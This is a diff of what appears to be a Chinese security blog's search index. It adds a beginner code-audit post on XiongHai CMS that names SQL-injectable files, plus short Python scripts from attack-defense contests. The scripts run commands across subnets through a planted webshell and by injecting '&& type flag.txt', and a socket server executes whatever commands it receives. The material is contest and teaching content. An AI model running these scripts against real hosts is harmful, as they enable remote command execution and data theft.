@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>iseacms代码审计入门级</title>
+      <link href="/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/"/>
+      <url>/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-iseacms-熊海CMS-介绍🅰️">0x01 iseacms 熊海CMS 介绍🅰️</h1><p>熊海CMS是由熊海开发的一款可广泛应用于个人博客，个人网站，企业网站的一套网站综合管理系统。</p><p>简的来说，就非常合适刚刚入门的 代码审计案例（简单到会看一点点php代码的人都会的审计），今天来复盘一下</p><p><img src="1.jpg" alt="1"></p><p>（其实已经复盘过了，只是再复盘一遍来充实blog，嘻嘻😄）</p><h1 id="0x02-实战">0x02 实战</h1><p>需要用到 seay源代码审计系统</p><p><img src="2.jpg" alt="2"></p><p>个人喜欢直接上 自动审计所以，走一波</p><p><img src="3.jpg" alt="3"></p><p>seay自动审计出来的，一般不一定100%存在漏洞，它原理是正则去匹配那些函数，比如 eval() 可能就 会写上关于eval() 函数的正则匹配。嘛。不过比起手动慢慢的看，能省去很多麻烦。有能力的也可以先<strong>代码通读</strong> 再自动化审计，每个人方法不一，我就 用我的方法。</p><p><img src="4.jpg" alt="4"></p><p>点过去看到，带有正则匹配和转义的函数。</p><p>正则匹配**\W** 写死了。</p><p><img src="5.jpg" alt="5"></p><p>接着往上看</p><p>/seacmseditor/php/controller.php：11行</p><p><img src="6.jpg" alt="6"></p><p>这三个存在漏洞且能利用。</p><p>需要GET传参 action, <strong>switch 多选函数.</strong></p><p>先第一个uploadfile 上传打开抓包上传试一下。</p><p><img src="7.jpg" alt="7"></p><p>unicode 解码看一下\u672a\u77e5\u9519\u8bef =&gt; 未知错误 🙅</p><p>完美，未知错误</p><p>下一个，SQL注入</p><h1 id="0x03-多处SQL注入">0x03 多处SQL注入</h1><p>/files/content.php：19行</p><p><img src="8.jpg" alt="8"></p><p>加了 转义函数</p><p>可以使用 宽字节注入(有条件)</p><p>报错注入</p><p>这里就使用 报错注入 把</p><p><img src="9.jpg" alt="9"></p><p>宽字节注入需要 GBK编码</p><p><img src="10.jpg" alt="10"></p><p>白盒审计 源代码 里明显没有单独设置 编码所以是不行的。</p><p><img src="11.jpg" alt="11"></p><p>成功报出数据库</p><p>同样存在SQL注入的文件:</p><p>/files/software.php</p><p>/admin/files/reply.php</p><p>/admin/files/newlink.php</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> code </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Mark-once-WebShell_01</title>
       <link href="/2020/04/10/takeshell-01/"/>
       <url>/2020/04/10/takeshell-01/</url>
@@ -457,6 +476,31 @@
     
     
     <entry>
+      <title>【Python】:WebShell</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">"webshellsave.txt"</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    ip=<span class="string">"192.168."</span>+str(i)+<span class="string">".128"</span></span><br><span class="line">    url=<span class="string">"http://"</span>+ip+<span class="string">"/WebShell.php/"</span></span><br><span class="line">    payload=&#123;<span class="string">'cmd'</span>:<span class="string">'cat /root/flag*.txt'</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        flag.write(r.url+<span class="string">"\n"</span>+r.text)</span><br><span class="line">        print(<span class="string">"GET FLAG! &gt;&gt;"</span>,r.url,<span class="string">'\n'</span>,r.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\nConnect Fail &gt;&gt;"</span>,url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>,<span class="number">254</span>):</span><br><span class="line">    t = threading.Thread(target=run, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><em><strong>转载请标明出处</strong></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【Python】:PyMySQL</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
@@ -482,11 +526,11 @@
     
     
     <entry>
-      <title>【Python】:WebShell</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
+      <title>【Python】:WebShell_urilb</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
       
-        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">"webshellsave.txt"</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    ip=<span class="string">"192.168."</span>+str(i)+<span class="string">".128"</span></span><br><span class="line">    url=<span class="string">"http://"</span>+ip+<span class="string">"/WebShell.php/"</span></span><br><span class="line">    payload=&#123;<span class="string">'cmd'</span>:<span class="string">'cat /root/flag*.txt'</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        flag.write(r.url+<span class="string">"\n"</span>+r.text)</span><br><span class="line">        print(<span class="string">"GET FLAG! &gt;&gt;"</span>,r.url,<span class="string">'\n'</span>,r.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\nConnect Fail &gt;&gt;"</span>,url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>,<span class="number">254</span>):</span><br><span class="line">    t = threading.Thread(target=run, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><em><strong>转载请标明出处</strong></em></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WebShell</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"dir"</span>: <span class="string">"&amp;&amp; type flag.txt"</span>&#125;</span><br><span class="line">    url = <span class="string">"http://192.168.123."</span>+str(i)+<span class="string">"/DirCtrl.php"</span></span><br><span class="line">    data_string=urllib.parse.urlencode(data)</span><br><span class="line">    new_url=url+<span class="string">"?"</span>+data_string</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        send = urllib.request.urlopen(new_url,timeout=<span class="number">1</span>)</span><br><span class="line">        print(send.read().decode(<span class="string">"utf8"</span>,<span class="string">"ignore"</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    t = threading.Thread(target=WebShell, args=(i, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -537,31 +581,6 @@
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
       
         <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD</p><ul><li><strong>Server:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> data, s</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"等待连接中……"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn,addr = s.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            print(<span class="string">'收到命令'</span>)</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">            cmd = os.popen(data.decode())</span><br><span class="line">            os_result = cmd.read()</span><br><span class="line">            conn.sendall(os_result.encode(<span class="string">'utf8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><ul><li><strong>Client:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">ServerIP=(<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br><span class="line">    s.connect(ServerIP)</span><br><span class="line">    print(<span class="string">'[+]连接成功'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'[-]服务器无响应'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data=input(<span class="string">'[CMD]&gt;&gt;'</span>)</span><br><span class="line">    s.sendto(bytes(data,encoding=<span class="string">'utf8'</span>),ServerIP)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'[+]回显成功'</span>)</span><br><span class="line">    print(data.decode())</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>【Python】:WebShell_urilb</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WebShell</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"dir"</span>: <span class="string">"&amp;&amp; type flag.txt"</span>&#125;</span><br><span class="line">    url = <span class="string">"http://192.168.123."</span>+str(i)+<span class="string">"/DirCtrl.php"</span></span><br><span class="line">    data_string=urllib.parse.urlencode(data)</span><br><span class="line">    new_url=url+<span class="string">"?"</span>+data_string</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        send = urllib.request.urlopen(new_url,timeout=<span class="number">1</span>)</span><br><span class="line">        print(send.read().decode(<span class="string">"utf8"</span>,<span class="string">"ignore"</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    t = threading.Thread(target=WebShell, args=(i, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
